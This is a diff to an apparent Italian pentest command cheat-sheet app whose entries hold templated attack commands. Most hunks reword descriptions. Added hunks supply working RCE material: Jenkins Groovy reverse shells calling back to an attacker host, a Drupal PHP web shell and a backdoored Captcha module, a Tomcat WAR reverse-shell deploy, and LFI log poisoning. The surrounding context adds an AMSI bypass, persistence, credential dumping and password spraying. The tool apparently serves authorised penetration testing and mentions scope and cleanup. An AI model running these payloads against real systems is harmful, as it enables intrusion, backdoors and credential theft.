-        "description": "`secure_file_priv` vuoto = puoi scrivere file ovunque (OUTFILE/UDF ok); se è `NULL` la RCE via file è impossibile. `plugin_dir` = dove caricare la `.so` per l'UDF."
+        "description": "Un `secure_file_priv` vuoto consente la scrittura di file ovunque, quindi OUTFILE e UDF sono percorribili; con `NULL` la RCE via file è impossibile. `plugin_dir` indica dove caricare la `.so` per l'UDF."
       },
       {
         "id": "grants",
         "label": "Ho FILE privilege?",
         "template": "SHOW GRANTS FOR CURRENT_USER();",
-        "description": "Cerca `FILE` (o `ALL PRIVILEGES`). Senza `FILE` niente OUTFILE, LOAD_FILE o UDF-via-outfile."
+        "description": "Il privilegio da cercare è `FILE`, o in alternativa `ALL PRIVILEGES`. Senza `FILE` non sono possibili OUTFILE, LOAD_FILE né UDF via outfile."
       },
       {
         "id": "whoami",
@@ -4655,7 +4731,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "mysql",
     "group": "Exploitation",
-    "description": "Esecuzione comandi dal database MySQL. Entrambe le vie richiedono `FILE` privilege e `secure_file_priv` permissivo (vedi `MySQL — check RCE`).\n- webshell: scrivi un `.php` nel webroot con `INTO OUTFILE`, poi la esegui via HTTP\n- UDF: carichi `lib_mysqludf_sys.so` nel `plugin_dir` e crei `sys_eval` per lanciare comandi come l'utente mysqld",
+    "description": "Esecuzione comandi dal database MySQL. Entrambe le vie richiedono il privilegio `FILE` e un `secure_file_priv` permissivo, come descritto in `MySQL — check RCE`.\n- webshell: scrittura di un `.php` nel webroot con `INTO OUTFILE`, che viene poi eseguito via HTTP\n- UDF: caricamento di `lib_mysqludf_sys.so` nel `plugin_dir` e creazione di `sys_eval` per lanciare comandi come l'utente mysqld",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -4865,7 +4941,7 @@ const COMMANDS = [
         "description": "Apre lo stream in VLC."
       }
     ],
-    "note": "# Path RTSP comuni\n- Hikvision: `/Streaming/Channels/101`\n- Dahua: `/cam/realmonitor?channel=1&subtype=0`\n- Generici: `/live.sdp`, `/h264`, `/mpeg4`, `/video1`\n# Credenziali di default\n- `admin:admin` · `admin:12345` · `admin:` (vuota) · `root:root` · Dahua `888888:888888`\nSe non conosci il path, usa `cameradar` che lo trova da solo.",
+    "note": "# Path RTSP comuni\n- Hikvision: `/Streaming/Channels/101`\n- Dahua: `/cam/realmonitor?channel=1&subtype=0`\n- Generici: `/live.sdp`, `/h264`, `/mpeg4`, `/video1`\n# Credenziali di default\n- `admin:admin` · `admin:12345` · `admin:` (vuota) · `root:root` · Dahua `888888:888888`\nQuando il path è ignoto, `cameradar` lo individua da solo.",
     "refs": [
       {
         "label": "HackTricks — 554 Pentesting RTSP",
@@ -4913,7 +4989,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "vnc",
     "group": "Access",
-    "description": "Connettiti al desktop VNC. Se `vnc-info` mostra auth `None` entri senza password (comune su telecamere e IoT).",
+    "description": "Connessione al desktop VNC. Se `vnc-info` riporta auth `None` l'accesso avviene senza password, situazione comune su telecamere e dispositivi IoT.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -4940,7 +5016,7 @@ const COMMANDS = [
         "id": "default",
         "label": "vncviewer",
         "template": "vncviewer <ip>:5900",
-        "description": "Connessione diretta al display :0. Senza auth entri subito."
+        "description": "Connessione diretta al display :0. In assenza di autenticazione l'accesso è immediato."
       },
       {
         "id": "noneauth",
@@ -5012,7 +5088,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "winrm",
     "group": "Shell",
-    "description": "Verifica se le credenziali danno accesso WinRM: cerca il flag `(Pwn3d!)` = puoi avere una shell. `-x` esegue un comando al volo.",
+    "description": "Verifica se le credenziali danno accesso WinRM: il flag `(Pwn3d!)` indica che la shell è ottenibile. `-x` esegue un comando al volo.",
     "platform": "linux",
     "requires": [
       "password",
@@ -5052,7 +5128,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Check accesso",
         "template": "nxc winrm <ip> -u '<user>' -p '<password>'",
-        "description": "Conferma l’accesso WinRM: `(Pwn3d!)` significa che puoi prendere una shell."
+        "description": "Conferma l'accesso WinRM: `(Pwn3d!)` indica che la shell è ottenibile."
       },
       {
         "id": "hash",
@@ -5176,7 +5252,7 @@ const COMMANDS = [
     "category": "service-enum",
     "subcategory": "web-apps",
     "group": "CMS",
-    "description": "Scanner WordPress: enumera plugin/temi/utenti e, con `--api-token`, mostra i CVE noti. In brute usa `-U`/`-P` contro `wp-login`.",
+    "description": "Scanner WordPress: enumera plugin, temi e utenti e, con `--api-token`, mostra i CVE noti. In modalità brute force `-U` e `-P` agiscono contro `wp-login`.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -5288,6 +5364,7 @@ const COMMANDS = [
       "brute"
     ],
     "template": "nmap -p<port> --script http-tomcat-manager-bruteforce <ip>",
+    "variants": [{"id": "default", "label": "nmap brute", "template": "nmap -p<port> --script http-tomcat-manager-bruteforce <ip>", "description": "Bruteforce delle credenziali del Manager con lo script NSE, che prova la lista dei default noti come `tomcat:tomcat` e `admin:admin`."}, {"id": "msf", "label": "metasploit", "template": "msfconsole -q -x \"use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS <ip>; set RPORT <port>; set STOP_ON_SUCCESS true; run; exit\"", "description": "Modulo Metasploit con la sua wordlist di default per il Manager. `STOP_ON_SUCCESS` interrompe al primo successo per non generare richieste inutili."}, {"id": "deploy", "label": "deploy WAR (RCE)", "template": "# genera prima il WAR: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war -o shell.war\ncurl -u <user>:<password> --upload-file shell.war \"http://<ip>:<port>/manager/text/deploy?path=/shell\"\n# poi triggera la shell: curl http://<ip>:<port>/shell/", "description": "Con credenziali valide, il deploy di un WAR contenente una JSP shell dà RCE. L'app deployata a `/shell` esegue il payload alla prima richiesta, restituendo la shell sul listener."}],
     "params": [
       {
         "key": "port",
@@ -5299,7 +5376,11 @@ const COMMANDS = [
         "label": "Target",
         "ctx": "ip",
         "placeholder": "10.10.10.11"
-      }
+      },
+  { "key": "user", "label": "Utente Manager", "ctx": "user", "placeholder": "tomcat" },
+  { "key": "password", "label": "Password", "ctx": "password", "placeholder": "admin" },
+  { "key": "lhost", "label": "LHOST", "placeholder": "10.10.14.3" },
+  { "key": "lport", "label": "LPORT", "placeholder": "443" }
     ],
     "refs": [
       {
@@ -5361,12 +5442,157 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "jenkins-script",
+    "name": "Jenkins Script Console — Groovy RCE",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "App Server",
+    "description": "La Script Console di Jenkins, raggiungibile su `/script`, esegue codice Groovy arbitrario con i privilegi del processo, spesso SYSTEM su Windows o l'utente jenkins/root su Linux. L'accesso arriva da credenziali di default `admin:admin`, da un'istanza senza autenticazione o da un account amministrativo. Da Groovy si invocano comandi di sistema con `.execute()` oppure si apre direttamente una reverse shell.",
+    "platform": "cross-platform",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "jenkins",
+      "groovy",
+      "rce",
+      "script-console"
+    ],
+    "template": "def proc = \"<command>\".execute()\nproc.waitFor()\nprintln proc.text",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "command",
+        "label": "Comando",
+        "placeholder": "id"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.3"
+      },
+      {
+        "key": "lport",
+        "label": "LPORT",
+        "placeholder": "443"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "exec comando",
+        "template": "def proc = \"<command>\".execute()\nproc.waitFor()\nprintln proc.text",
+        "description": "Esecuzione di un singolo comando: `.execute()` avvia il processo e `proc.text` ne restituisce l'output nella console. È la prova diretta della RCE, di norma con `id` o `whoami`."
+      },
+      {
+        "id": "linux",
+        "label": "reverse shell Linux",
+        "template": "String[] cmd = [\"/bin/bash\", \"-c\", \"exec 5<>/dev/tcp/<lhost>/<lport>;cat <&5 | while read line; do \\$line 2>&5 >&5; done\"] as String[]\nRuntime.getRuntime().exec(cmd)",
+        "description": "Reverse shell su host Linux. Groovy apre un socket `/dev/tcp` verso l'attaccante e vi collega una shell bash. Serve un listener già in ascolto sulla porta scelta come LPORT."
+      },
+      {
+        "id": "windows",
+        "label": "reverse shell Windows",
+        "template": "String host=\"<lhost>\";int port=<lport>;String cmd=\"cmd.exe\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();",
+        "description": "Reverse shell su host Windows. `ProcessBuilder` avvia `cmd.exe` e ne collega input e output al socket verso l'attaccante. Su Windows Jenkins gira spesso come SYSTEM, quindi la shell arriva già privilegiata."
+      }
+    ],
+    "note": "# Nodi e accesso anonimo\nSu alcune configurazioni la console risponde anche da `/computer/(master)/script`. Dalla 2.x con setup wizard l'accesso anonimo è disabilitato di default, quindi conta l'esito del login prima di puntare alla console.",
+    "refs": [
+      {
+        "label": "HackTricks — Jenkins",
+        "url": "https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/jenkins.html"
+      }
+    ]
+  },
+  {
+    "id": "drupal-rce",
+    "name": "Drupal — RCE (PHP filter / Drupalgeddon)",
+    "category": "service-enum",
+    "subcategory": "web-apps",
+    "group": "CMS",
+    "description": "Ottenere una shell su Drupal non è immediato come su altri CMS. Le vie principali sono tre: sui core datati la SQLi pre-auth Drupalgeddon2 (CVE-2018-7600) dà RCE senza credenziali; con accesso amministrativo il modulo PHP filter permette di pubblicare una pagina che esegue PHP; in alternativa si carica un modulo legittimo modificato con una web shell. Il codice gira come utente del web server, di norma www-data.",
+    "platform": "linux",
+    "requires": [
+      "no-creds"
+    ],
+    "protocols": [
+      "http"
+    ],
+    "tags": [
+      "drupal",
+      "cms",
+      "php-filter",
+      "drupalgeddon",
+      "rce"
+    ],
+    "template": "# Drupal <8: attivazione del modulo core \"PHP filter\"\n# Drupal >=8: installazione prima del modulo php-8.x-1.1.tar.gz da drupal.org\n# Content > Add content > Basic page, Text format \"PHP code\", corpo della pagina:\n<?php system($_GET['<hash>']); ?>\n# la pagina viene salvata su /node/<node>, esecuzione comandi:\ncurl -s \"http://<ip>/node/<node>?<hash>=id\"",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "drupal.inlanefreight.local"
+      },
+      {
+        "key": "hash",
+        "label": "Nome parametro",
+        "placeholder": "dcfdd5e021a869fcc6dfaef8bf31377e"
+      },
+      {
+        "key": "node",
+        "label": "Node ID",
+        "placeholder": "3"
+      },
+      {
+        "key": "lhost",
+        "label": "LHOST",
+        "placeholder": "10.10.14.3"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "PHP filter (web shell)",
+        "template": "# Drupal <8: attivazione del modulo core \"PHP filter\"\n# Drupal >=8: installazione prima del modulo php-8.x-1.1.tar.gz da drupal.org\n# Content > Add content > Basic page, Text format \"PHP code\", corpo della pagina:\n<?php system($_GET['<hash>']); ?>\n# la pagina viene salvata su /node/<node>, esecuzione comandi:\ncurl -s \"http://<ip>/node/<node>?<hash>=id\"",
+        "description": "Modulo PHP filter come vettore. Prima della 8 è nel core e basta abilitarlo, dalla 8 va installato a parte. Una Basic page con Text format `PHP code` esegue lo snippet, e il parametro GET rinominato con un hash evita una web shell dal nome ovvio. Modifica invasiva: richiede consenso e cleanup di modulo e pagina."
+      },
+      {
+        "id": "backdoor",
+        "label": "modulo backdoor",
+        "template": "wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz\ntar xf captcha-8.x-1.2.tar.gz\nprintf '<?php system($_GET[\"<hash>\"]); ?>' > captcha/shell.php\nprintf '<IfModule mod_rewrite.c>\\nRewriteEngine On\\nRewriteBase /\\n</IfModule>' > captcha/.htaccess\ntar czf captcha.tar.gz captcha/\n# Manage > Extend > + Install new module: upload di captcha.tar.gz, poi:\ncurl -s \"http://<ip>/modules/captcha/shell.php?<hash>=id\"",
+        "description": "Modulo legittimo trasformato in backdoor. Nell'archivio del modulo Captcha vengono aggiunti una web shell PHP e un `.htaccess` che sblocca l'accesso diretto a `/modules`; dopo l'installazione dal pannello la shell risponde su `/modules/captcha/shell.php`. Anche qui servono consenso e rimozione degli artefatti."
+      },
+      {
+        "id": "drupalgeddon2",
+        "label": "Drupalgeddon2 (CVE-2018-7600)",
+        "template": "msfconsole -q -x \"use exploit/unix/webapp/drupal_drupalgeddon2; set RHOSTS <ip>; set LHOST <lhost>; run; exit\"",
+        "description": "RCE pre-auth su Drupal < 7.58 e < 8.5.1, dovuta a sanitizzazione insufficiente in fase di registrazione utente. Nessuna credenziale richiesta: il modulo Metasploit consegna direttamente una sessione con i privilegi del web server."
+      }
+    ],
+    "note": "# Cleanup obbligatorio\nPHP filter e modulo backdoor modificano l'istanza del cliente: vanno concordati e poi rimossi, con modulo disabilitato e pagine o file cancellati. Le installazioni recenti bloccano `CHANGELOG.txt` e `README.txt`, quindi per la versione conviene droopescan.",
+    "refs": [
+      {
+        "label": "Drupal — SA-CORE-2018-002",
+        "url": "https://www.drupal.org/sa-core-2018-002"
+      }
+    ]
+  },
+  {
     "id": "gitlab-userenum",
     "name": "GitLab — user enumeration",
     "category": "service-enum",
     "subcategory": "web-apps",
     "group": "App Server",
-    "description": "L’API pubblica di GitLab elenca gli utenti senza autenticazione: utile per costruire una lista da spray. Controlla anche la versione per CVE note.",
+    "description": "L'API pubblica di GitLab elenca gli utenti senza autenticazione, il che permette di costruire una lista per il password spray. Va controllata anche la versione, per cercare CVE note.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -5426,7 +5652,7 @@ const COMMANDS = [
         "id": "union-null",
         "label": "UNION NULL",
         "template": "' UNION SELECT NULL-- -",
-        "description": "Aggiungi NULL finché l’errore sparisce: così conti le colonne."
+        "description": "Si aggiungono NULL finché l'errore sparisce: il numero raggiunto è quello delle colonne."
       },
       {
         "id": "sleep",
@@ -5467,7 +5693,7 @@ const COMMANDS = [
         "id": "default",
         "label": "ORDER BY",
         "template": "' ORDER BY 1-- -",
-        "description": "Incrementa il numero finché dà errore: trovi così quante colonne ci sono."
+        "description": "Il numero va incrementato finché la query non dà errore: il valore raggiunto indica quante colonne ci sono."
       },
       {
         "id": "union",
@@ -5552,7 +5778,7 @@ const COMMANDS = [
         "description": "Usa una request salvata: gestisce header, cookie e POST automaticamente."
       }
     ],
-    "note": "# Scegliere il parametro da iniettare\n- `-p <param>` = testa solo quel parametro, più veloce che provarli tutti. Es. `-p id`.\n- `*` = marcatore manuale del punto di injection: mettilo dove vuoi iniettare (path REST, header, valore JSON) e sqlmap prova lì. Es. `/api/user/1*` oppure `id=1*` in una request salvata (`-r`).",
+    "note": "# Scegliere il parametro da iniettare\n- `-p <param>` = testa solo quel parametro, più veloce che provarli tutti, per esempio `-p id`.\n- `*` = marcatore manuale del punto di injection, da collocare dove serve iniettare, che sia un path REST, un header o un valore JSON, e sqlmap prova lì. Per esempio `/api/user/1*` oppure `id=1*` in una request salvata con `-r`.",
     "refs": [
       {
         "label": "HackTricks — sqlmap",
@@ -5669,7 +5895,7 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "web-app-testing",
     "group": "File Inclusion",
-    "description": "Inietta PHP in un log (`User-Agent`, o username su `auth.log`), poi includilo via LFI per eseguirlo.\n- **Apache**: `/var/log/apache2/access.log`\n- **Nginx**: `/var/log/nginx/access.log`.",
+    "description": "Inietta codice PHP in un log, tramite `User-Agent` oppure come username su `auth.log`, per poi includerlo via LFI ed eseguirlo.\n- **Apache**: `/var/log/apache2/access.log`\n- **Nginx**: `/var/log/nginx/access.log`.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -5683,6 +5909,7 @@ const COMMANDS = [
       "rce"
     ],
     "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/\n# poi includi il log via LFI per eseguire:\nhttp://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id",
+    "variants": [{"id": "default", "label": "1. Inietta nel log", "template": "curl -A \"<?php system(\\$_GET['cmd']); ?>\" http://<ip>/", "description": "Il payload PHP entra nel log di access come valore dello User-Agent. La richiesta serve solo a scrivere nel log, quindi la risposta HTTP è irrilevante."}, {"id": "trigger", "label": "2. Includi ed esegui", "template": "curl \"http://<ip>/page?file=../../../../var/log/apache2/access.log&cmd=id\"", "description": "Includendo il log via LFI, il PHP iniettato viene eseguito e il parametro `cmd` ne controlla il comando. Il percorso del log cambia fra Apache e Nginx e deve essere leggibile dal processo web."}],
     "params": [
       {
         "key": "ip",
@@ -5732,7 +5959,7 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "web-app-testing",
     "group": "XXE",
-    "description": "Definisci un’entità esterna per leggere file o esfiltrare dati. Usa CDATA per file con caratteri speciali, blind OOB quando l’output non torna in risposta.",
+    "description": "Definisce un'entità esterna per leggere file o esfiltrare dati. CDATA serve per i file con caratteri speciali, mentre la variante blind OOB copre i casi in cui l'output non torna nella risposta.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -5804,7 +6031,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Operatori",
         "template": "; whoami",
-        "description": "Prova anche: | whoami · || whoami · & whoami · && whoami · $(whoami) · `whoami`."
+        "description": "Altri separatori da provare: | whoami · || whoami · & whoami · && whoami · $(whoami) · `whoami`."
       },
       {
         "id": "quote",
@@ -5816,7 +6043,7 @@ const COMMANDS = [
         "id": "ifs",
         "label": "Bypass spazi ($IFS)",
         "template": "cat${IFS}/etc/passwd",
-        "description": "Usa `${IFS}` (o `$IFS`) quando lo spazio è filtrato."
+        "description": "`${IFS}` o `$IFS` sostituiscono lo spazio quando è filtrato."
       }
     ],
     "refs": [
@@ -5887,7 +6114,7 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "web-app-testing",
     "group": "SSRF",
-    "description": "Fai partire la richiesta dal server: raggiungi servizi interni o l’endpoint metadata cloud. Se c’è un filtro, usa rappresentazioni alternative dell’IP.",
+    "description": "Fa partire la richiesta dal server, così da raggiungere servizi interni o l'endpoint metadata cloud. In presenza di un filtro si ricorre a rappresentazioni alternative dell'indirizzo IP.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -5988,7 +6215,7 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "web-app-testing",
     "group": "Access Control",
-    "description": "Cambia un identificatore nella request per accedere a risorse di altri utenti. Cerca ID sequenziali in URL, parametri e body.",
+    "description": "Modifica un identificatore nella request per accedere a risorse di altri utenti. Gli ID sequenziali si cercano in URL, parametri e body.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -6009,7 +6236,7 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "infrastructure",
     "group": "Exploit Search",
-    "description": "Cerca exploit pubblici per servizio e versione esatta. Leggi sempre il codice del PoC prima di lanciarlo.\n- `-x` = apri e leggi il PoC\n- `-m` = copia il PoC nella cartella corrente",
+    "description": "Cerca exploit pubblici per servizio e versione esatta. Il codice del PoC va sempre letto prima di lanciarlo.\n- `-x` = apre il PoC per la lettura\n- `-m` = copia il PoC nella cartella corrente",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -6110,7 +6337,7 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "infrastructure",
     "group": "Scanners",
-    "description": "Scanner web veloce per file pericolosi, header e misconfiguration. Rumoroso: usalo quando lo stealth non conta.",
+    "description": "Scanner web veloce per file pericolosi, header e misconfiguration. È rumoroso, quindi adatto solo quando lo stealth non conta.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -6167,7 +6394,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Linux ELF",
         "template": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf -o shell.elf",
-        "description": "Binario Linux: ricorda `chmod +x shell.elf` prima di eseguirlo."
+        "description": "Binario Linux, che richiede `chmod +x shell.elf` prima dell'esecuzione."
       },
       {
         "id": "exe",
@@ -6213,7 +6440,7 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "listeners",
     "group": "Netcat",
-    "description": "Listener TCP per ricevere la reverse shell. `rlwrap` aggiunge frecce e history alla shell ricevuta.",
+    "description": "Listener TCP che riceve la reverse shell. Va avviato prima di far partire il payload sul target, e resta in attesa senza restituire il prompt. `rlwrap` davanti al comando aggiunge cronologia e frecce direzionali alla shell ricevuta, in attesa della stabilizzazione vera con un PTY.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -6252,7 +6479,8 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "listeners",
     "group": "Metasploit",
-    "description": "Handler Metasploit per payload `meterpreter` o staged. Il payload del handler deve combaciare con quello generato.",
+    "description": "Handler di Metasploit che riceve le sessioni dai payload meterpreter o staged. Il payload configurato nell'handler deve combaciare esattamente con quello generato da msfvenom, altrimenti la sessione non si aggancia. Rispetto a un semplice netcat offre gestione di più sessioni, migrazione di processo e i moduli post.",
+    "note": "# Il payload deve combaciare\nUn payload staged come `windows/x64/meterpreter/reverse_tcp` richiede l'handler dello stesso tipo. Uno stageless come `..._reverse_tcp` va con l'handler stageless corrispondente: incrociarli fa fallire l'aggancio senza errori chiari.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -6283,7 +6511,7 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "webshells",
     "group": "Percorsi Kali",
-    "description": "Web shell già presenti su Kali, da caricare via file upload o LFI. Imposta `LHOST`/`LPORT` dentro `php-reverse-shell.php` prima di usarla.",
+    "description": "Web shell già presenti su Kali, da caricare via file upload o LFI. `LHOST` e `LPORT` vanno impostati dentro `php-reverse-shell.php` prima dell'uso.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -6332,7 +6560,7 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "cred-attacks",
     "group": "Username List",
-    "description": "Genera username plausibili da nomi/cognomi (`nome.cognome`, `n.cognome`, `ncognome`…). Da una lista di nomi reali ottieni la userlist per spray/brute.",
+    "description": "Genera username plausibili da nomi e cognomi, nelle forme `nome.cognome`, `n.cognome`, `ncognome` e simili. Da una lista di nomi reali si ottiene la userlist per spray e brute force.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -6414,7 +6642,7 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "cred-attacks",
     "group": "Spraying",
-    "description": "Prova una password su tutta la userlist. **Verifica prima la lockout policy** (`--pass-pol`): se la soglia è >0, un solo tentativo per giro. `--continue-on-success` non si ferma al primo successo.",
+    "description": "Prova una password su tutta la userlist. **La lockout policy va verificata prima** con `--pass-pol`: con una soglia maggiore di zero è ammesso un solo tentativo per giro. `--continue-on-success` non si ferma al primo successo.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -6519,7 +6747,7 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "cred-attacks",
     "group": "Hash Cracking",
-    "description": "Estrai l’hash da un file protetto con uno script `*2john`, poi craccalo. \n`locate *2john*` per vederli tutti.",
+    "description": "Estrae l'hash da un file protetto con uno script `*2john`, che poi viene craccato.\n`locate *2john*` elenca tutti gli script disponibili.",
     "platform": "linux",
     "requires": [
       "hash"
@@ -6571,7 +6799,7 @@ const COMMANDS = [
     "category": "exploitation",
     "subcategory": "cred-attacks",
     "group": "Spraying",
-    "description": "Spray via Kerberos: genera eventi `4768`/`4771` ma non `4625` (failed logon), quindi più stealth. Con un tentativo per giro non blocca gli account.",
+    "description": "Password spray via Kerberos: genera gli eventi 4768 e 4771 sul domain controller ma non il 4625 di logon fallito, il che lo rende più discreto di uno spray su SMB. Con un solo tentativo per giro distribuito sugli utenti resta sotto la soglia di lockout. Vuole una lista di username già validati e una password da provare.",
     "platform": "linux",
     "requires": [
       "no-creds"
@@ -6692,7 +6920,7 @@ const COMMANDS = [
         "id": "amsi",
         "label": "AMSI bypass",
         "template": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
-        "description": "Disabilita AMSI in memoria; eseguilo prima di caricare script PowerShell. 🚩 firmato dai SIEM."
+        "description": "Disabilita AMSI in memoria e va eseguito prima di caricare script PowerShell. 🚩 firmato dai SIEM."
       }
     ]
   },
@@ -6702,7 +6930,7 @@ const COMMANDS = [
     "category": "post-exp",
     "subcategory": "situational-awareness",
     "group": "Linux",
-    "description": "Identità, host e fingerprint OS: punto di partenza per capire dove sei e cosa puoi diventare.",
+    "description": "Identità, host e fingerprint del sistema operativo: è il punto di partenza per capire su quale macchina si è finiti e verso quale utente si può salire.",
     "platform": "linux",
     "requires": [
       "shell"
@@ -6757,7 +6985,7 @@ const COMMANDS = [
     "category": "post-exp",
     "subcategory": "situational-awareness",
     "group": "Windows",
-    "description": "Privilegi, gruppi e SID del token. Guarda i privilegi (`SeImpersonatePrivilege`…) e i gruppi locali.",
+    "description": "Privilegi, gruppi e SID del token. I privilegi da controllare per primi sono quelli del tipo `SeImpersonatePrivilege`, insieme ai gruppi locali di appartenenza.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -6917,7 +7145,8 @@ const COMMANDS = [
     "category": "post-exp",
     "subcategory": "cred-harvesting",
     "group": "Windows",
-    "description": "Dump di SAM/LSA/NTDS via RPC. `-just-dc-ntlm` estrae solo gli hash NTLM del dominio (conferma rapida DA).",
+    "description": "Estrae le credenziali via RPC dai tre depositi di Windows: SAM per gli account locali, i segreti LSA e il database NTDS del dominio. Con `-just-dc-ntlm` preleva i soli hash NTLM del dominio, che è la conferma più rapida di aver ottenuto Domain Admin. Accetta password, hash o ticket.",
+    "note": "# Dump di NTDS offline\nCon `SeBackupPrivilege` si copiano `NTDS.dit` e gli hive `SYSTEM` e `SECURITY`, poi `secretsdump -ntds NTDS.dit -system SYSTEM LOCAL` estrae tutti gli hash di dominio senza toccare il DC via rete.",
     "platform": "linux",
     "requires": [
       "password",
@@ -7054,7 +7283,7 @@ const COMMANDS = [
         "id": "default",
         "label": "Credential Manager",
         "template": "cmdkey /list",
-        "description": "Elenca le credenziali salvate; per riusarne una vedi la variante `runas /savecred`."
+        "description": "Elenca le credenziali salvate. Per riutilizzarne una c'è la variante `runas /savecred`."
       },
       {
         "id": "runas",
@@ -7191,7 +7420,7 @@ const COMMANDS = [
     "category": "post-exp",
     "subcategory": "pillaging",
     "group": "Share Hunt",
-    "description": "Cerca nelle share SMB documenti con parole chiave, oppure per estensione. Da Linux.",
+    "description": "Setaccia le share SMB del dominio alla ricerca di documenti che contengono parole chiave, oppure filtrando per estensione, il tutto da Linux. È lo strumento principale per il pillaging su rete: password in file di configurazione, chiavi private e backup finiscono di frequente in share accessibili a qualsiasi utente autenticato. Ogni risultato riporta share, percorso e contesto del match.",
     "platform": "linux",
     "requires": [
       "password"
@@ -7243,7 +7472,7 @@ const COMMANDS = [
     "category": "post-exp",
     "subcategory": "persistence",
     "group": "Linux",
-    "description": "Mantieni l’accesso: la tua chiave negli `authorized_keys` o un cron job con reverse shell. Solo se in scope.",
+    "description": "Mantiene l'accesso tramite la propria chiave pubblica negli `authorized_keys` oppure un cron job con reverse shell. Da usare solo se lo scope lo prevede.",
     "platform": "linux",
     "requires": [
       "shell"
@@ -7276,7 +7505,7 @@ const COMMANDS = [
         "id": "default",
         "label": "SSH key",
         "template": "mkdir -p ~/.ssh; echo \"<pubkey>\" >> ~/.ssh/authorized_keys",
-        "description": "La tua chiave pubblica: login senza password."
+        "description": "Chiave pubblica dell'attaccante, che abilita il login senza password."
       },
       {
         "id": "cron",
@@ -7292,7 +7521,7 @@ const COMMANDS = [
     "category": "post-exp",
     "subcategory": "persistence",
     "group": "Windows",
-    "description": "Mantieni l’accesso: chiave Run nel registro, scheduled task come SYSTEM, o nuovo utente admin locale. Solo se in scope.",
+    "description": "Mantiene l'accesso tramite chiave Run nel registro, scheduled task come SYSTEM o un nuovo utente amministratore locale. Da usare solo se lo scope lo prevede.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -7331,7 +7560,7 @@ const COMMANDS = [
     "category": "post-exp",
     "subcategory": "file-transfer",
     "group": "HTTP",
-    "description": "Ospita i file su un server HTTP dall’attacker, poi scaricali dal target col tool disponibile.",
+    "description": "Ospita i file su un server HTTP lato attaccante, da cui vengono poi scaricati sul target con il tool disponibile.",
     "platform": "cross-platform",
     "requires": [
       "shell"
@@ -7421,7 +7650,7 @@ const COMMANDS = [
         "id": "copy",
         "label": "Copia (Windows)",
         "template": "copy \\\\<lhost>\\share\\file.exe C:\\Temp\\",
-        "description": "Dal target Windows: copia dal tuo share."
+        "description": "Dal target Windows: copia dalla share dell'attaccante."
       }
     ]
   },
@@ -7501,7 +7730,7 @@ const COMMANDS = [
         "id": "local",
         "label": "Da file",
         "template": "./linpeas.sh | tee linpeas_output.txt",
-        "description": "Trasferisci ed esegui salvando l’output con `tee`."
+        "description": "Trasferimento ed esecuzione con salvataggio dell'output tramite `tee`."
       }
     ],
     "refs": [
@@ -7517,7 +7746,7 @@ const COMMANDS = [
     "category": "privesc",
     "subcategory": "auto-enum",
     "group": "Linux",
